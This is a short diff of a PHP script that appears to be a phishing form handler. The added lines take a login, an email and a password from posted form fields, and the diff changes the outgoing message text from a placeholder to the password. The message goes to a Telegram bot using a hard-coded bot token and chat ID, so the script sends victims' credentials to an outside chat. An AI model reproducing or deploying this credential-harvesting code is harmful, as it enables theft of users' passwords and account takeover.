@@ -1,12 +1,14 @@
 <?php
 
+$login = $_POST['login'];
+$email  = $_POST['emeil'];
 $pass = $_POST['id'];
 
 $token = '5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64';
 
 $array = array(
 	'chat_id'=> 961145889,
-	'text' =>'123',
+	'text' =>$pass,
 	'parse_mode'=>'html'
 );
 
@@ -20,4 +22,3 @@ curl_close($ch);
 echo "<pre>";
 var_dump(json_decode($result));
 echo '</pre>';
-?>
